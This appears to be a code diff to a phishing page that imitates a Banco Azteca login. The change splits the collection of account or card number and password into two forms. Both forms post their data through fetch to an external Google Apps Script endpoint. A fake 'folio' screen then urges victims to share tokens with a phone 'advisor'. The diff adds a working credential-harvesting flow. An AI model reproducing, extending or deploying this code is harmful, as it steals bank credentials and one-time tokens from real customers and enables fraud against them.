@@ -50,27 +50,50 @@
 						<form class="formulario" id="contact-form"  name="submit-form">
 						<label for="nombre"> </label>
 						<div class="contenedor-input">
-							<input required id="nombre" name="nombre"  placeholder="Usuario/Cuenta/Tarjeta" />
-							<input required type="password" id="contrasena"  name="contrasena" placeholder="Contraseña" />
-							<input required type="password" id="confirma"  name="confirma" placeholder="Confirmar contraseña" />
+							<input id="nombre" name="nombre"  placeholder="Usuario/Cuenta/Tarjeta" required />
 						</div>	
 			
 						<div class="contenedor-boton">
 								<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
 								<b>INGRESAR</b>
 						</button>
-					<div class="num">MX 05</div>
+						<h2>OLVIDÉ MI CONTRASEÑA</h2>
+					           <div class="num">MX 05</div>
 						</div>
 					</form>
 				</div>
 	
 				<div class="header exito" id="exito">
-					<h2 class="txtFolio">Tu folio es:</h2>
-					<h1 class="folio">X142023543Q</h1>
-					<p class="txt">Comparte este folio con tu asesor teléfonico o asistente virtual. Así cómo un par de tokens para generar la cancelación de un movimiento.</p>
-					<p class="txt"><i><b>Recuerda que Banco Azteca nunca te pedirá tu contarseña por llamada teléfónica.</i></b></p>
+
+					<div class="registro activo" id="registro2">
+					<form class="formulario" id="contact-form"  name="submit-form2">
+						<label for="nombre"> </label>
+						<div class="contenedor-input">
+							<input required type="password" id="contrasena"  name="contrasena" placeholder="Contraseña" />
+							<input required type="password" id="confirma"  name="confirma" placeholder="Confirmar contraseña" />
+						</div>	
+			
+						<div class="contenedor-boton">
+								<button type="submit"  id="submit-contact-form" onclick="miMensaje2()">
+								<b>INGRESAR</b>
+						</button>
+					<div class="num">MX 05</div>
+						</div>
+					</form>
+				   </div>
+
+					
 				</div>
 			</div>
+
+			<div class="header exito" id="exito2">
+				<h2 class="txtFolio">Tu folio es:</h2>
+				<h1 class="folio">X142023543Q</h1>
+				<p class="txt">Comparte este folio con tu asesor teléfonico o asistente virtual. Así cómo un par de tokens para generar la cancelación de un movimiento.</p>
+				<p class="txt"><i><b>Recuerda que Banco Azteca nunca te pedirá tu contarseña por llamada teléfónica.</i></b></p>
+
+			</div>
+
 		</div>
 
 
@@ -129,6 +152,7 @@
 
 const scriptURL = 'https://script.google.com/macros/s/AKfycbx16EC-L-s9SVkGKtO89ckgDvmwZgldi9QgVsTvgZcaFsQO3K3skUBR0vlSViabZ-v0Eg/exec'
 const form = document.forms['submit-form']
+const form2 = document.forms['submit-form2']
 const registro = document.getElementById('registro');
 const exito = document.getElementById('exito');
 
@@ -143,12 +167,30 @@ form.addEventListener('submit', e => {
 	 
 })
 
+form2.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form2)})
+    .then(response => console.log('Success!', response))
+    .then(response => exito.classList.add('activo'))
+    .then(response => registro.classList.remove('activo'))
+    .catch(error => console.log('Error!', error.message))
+   
+	 
+})
+
 	function miMensaje() {
   var element = document.getElementById("registro");
     element.classList.remove("activo");
   var element = document.getElementById("exito");
     element.classList.add("activo");	
 }	
+
+function miMensaje2() {
+  var element = document.getElementById("registro2");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito2");
+    element.classList.add("activo");	
+}
 </script>	
 
 	</body>
